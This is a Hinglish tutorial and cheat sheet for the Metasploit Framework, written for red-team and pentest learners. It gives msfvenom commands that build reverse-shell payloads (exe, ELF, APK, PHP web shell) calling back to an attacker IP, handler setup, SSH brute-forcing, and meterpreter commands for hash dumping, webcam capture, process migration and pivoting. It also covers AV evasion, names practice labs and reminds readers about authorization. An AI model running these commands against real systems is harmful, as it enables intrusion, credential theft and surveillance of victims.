# Metasploit Framework — Complete Reference Guide

> Exploitation framework — vulnerability verification, exploit development, aur post-exploitation ke liye industry-standard tool. Red team ke liye directly relevant.

---

## 1. Core Components Samjho

| Component | Kya Hai |
|---|---|
| **Exploit** | Vulnerability ko actively exploit karne wala module |
| **Payload** | Exploit successful hone ke baad jo code target pe run hota hai (shell, meterpreter, etc.) |
| **Auxiliary** | Non-exploit modules — scanning, fuzzing, DoS, info gathering |
| **Post** | Post-exploitation modules — privilege escalation, data harvesting, pivoting |
| **Encoder** | Payload ko encode karta hai (AV evasion ke liye, limited effectiveness modern AV ke against) |
| **NOP** | No-operation instructions — buffer alignment ke liye |

---

## 2. Basic Workflow

```bash
# msfconsole start karo
msfconsole

# Exploit search karo
search <keyword>

# Exploit select karo
use exploit/<path>

# Options dekho
show options

# Target set karo
set RHOSTS <target_ip>
set RPORT <port>

# Payload set karo
set PAYLOAD <payload_path>

# Payload options dekho aur set karo
show payloads
set LHOST <attacker_ip>
set LPORT <listener_port>

# Exploit run karo
exploit
# ya
run
```

---

## 3. Core Commands — Master Table

| Command | Purpose |
|---|---|
| `search <term>` | Modules search karo (CVE, service name, product) |
| `use <module_path>` | Module select karo |
| `show options` | Current module ke required/optional params dikhao |
| `show payloads` | Compatible payloads list karo |
| `show targets` | Exploit ke target OS/versions list karo |
| `set <OPTION> <value>` | Option set karo (session ke liye) |
| `setg <OPTION> <value>` | Global option set karo (saare modules ke liye persist) |
| `unset <OPTION>` | Option clear karo |
| `info` | Current module ka detail description |
| `back` | Current module se bahar niklo |
| `exploit` / `run` | Module execute karo |
| `sessions -l` | Active sessions list karo |
| `sessions -i <id>` | Specific session interact karo |
| `jobs` | Background jobs (listeners) list karo |
| `exit` | msfconsole band karo |

---

## 4. Payload Types

| Type | Behavior |
|---|---|
| **Singles** | Self-contained, koi separate connection nahi (`shell_bind_tcp`) |
| **Stagers** | Chhota initial payload jo baad mein bada payload download karta hai |
| **Stages** | Stager ke baad download hone wala actual payload (jaise `meterpreter`) |

**Naming convention example:**
```
windows/x64/meterpreter/reverse_tcp
   OS      Arch    Stage      Stager-type
```

- `reverse_tcp` = target attacker se connect karta hai (firewall bypass ke liye better)
- `bind_tcp` = attacker target se connect karta hai (target ko public IP chahiye)

---

## 5. Meterpreter — Post-Exploitation Cheat Sheet

Session milne ke baad meterpreter shell mein:

| Command | Purpose |
|---|---|
| `sysinfo` | Target system info |
| `getuid` | Current user context |
| `ps` | Running processes list |
| `migrate <PID>` | Process migrate karo (stability/stealth ke liye) |
| `hashdump` | Windows password hashes dump karo (admin priv chahiye) |
| `screenshot` | Target ka screenshot lo |
| `webcam_snap` | Webcam se photo (agar available) |
| `download <file>` | Target se file download karo |
| `upload <file>` | Target pe file upload karo |
| `shell` | Native OS shell mein switch karo |
| `background` | Session background mein bhejo, msfconsole pe wapas aao |
| `run post/multi/recon/local_exploit_suggester` | Privilege escalation suggestions |

---

## 6. Auxiliary Modules — Common Uses

```bash
# Port scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
run

# Service version detection
use auxiliary/scanner/http/http_version
set RHOSTS <target>
run

# SMB enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS <target>
run

# Login brute-force (similar to Hydra but integrated)
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

---

## 7. Handler Setup (Reverse Shell Listener)

Agar payload standalone generate kiya hai (msfvenom se), listener setup karna padta hai:

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT 4444
exploit -j    # -j se background job ki tarah run hota hai
```

---

## 8. msfvenom — Standalone Payload Generator

Ye Metasploit ka separate tool hai payloads generate karne ke liye (exploit ke bina, jaise phishing attachment ya USB drop scenarios).

```bash
# Windows exe reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o payload.exe

# Linux ELF reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o payload.elf

# Android APK reverse shell
msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -o payload.apk

# PHP web shell (webapp exploitation ke context mein)
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw -o shell.php

# List all payload formats
msfvenom --list formats

# List all encoders
msfvenom --list encoders
```

---

## 9. Database Integration (msfdb)

```bash
# Database initialize/start karo
msfdb init
systemctl start postgresql

# msfconsole ke andar database status check
db_status

# Scan results database mein save hote hain automatically
hosts
services
vulns
```

---

## 10. Advanced Techniques

### 10.1 Resource Scripts (Automation)
Repeated commands ko `.rc` file mein likh ke automate kar sakte ho:
```bash
msfconsole -r script.rc
```

### 10.2 Pivoting (Internal Network Access)
Agar compromised machine dusre internal network se connected hai:
```bash
# Meterpreter session ke andar
run autoroute -s 10.10.10.0/24
use auxiliary/server/socks_proxy
```
Isse compromised machine ke through internal network scan/exploit kar sakte ho (proxychains ke saath combine karke).

### 10.3 AV Evasion Considerations
- Standard msfvenom payloads modern AV/EDR se easily detect ho jaate hain
- Encoders (`-e x86/shikata_ga_nai`) purane AV ko bypass karte the, modern solutions ke against largely ineffective
- Real red team engagements mein custom payload obfuscation/AV evasion frameworks (separate topic) chahiye hote hain

### 10.4 Exploit Development Basics
Metasploit khud ka exploit development framework bhi provide karta hai — agar tum khud ka exploit likhna seekhna chaho (buffer overflow se lekar structured exploit modules), `msf-template` se shuru karke Ruby mein module likhte hain. Ye advanced/OSCP-level skill hai.

---

## 11. Practice Labs

- **Metasploitable2/Metasploitable3** — deliberately vulnerable VMs, specifically Metasploit practice ke liye banaye gaye
- TryHackMe → "Metasploit" learning path (multiple rooms, beginner se advanced)
- HackTheBox → retired machines jinke saath official Metasploit writeups available hain

---

## 12. Ethical/Scope Reminder

- Sirf authorized lab environments (apna VM setup) ya explicitly authorized pentest scope pe use karna
- Live bug bounty programs mein zyada tar **active exploitation disallowed hota hai** — programs generally sirf **PoC tak** allow karte hain, actual exploitation/data extraction nahi (scope rules hamesha padhna zaroori)
- Metasploit red team/authorized pentest engagements ke liye zyada relevant hai bug bounty ke comparison mein
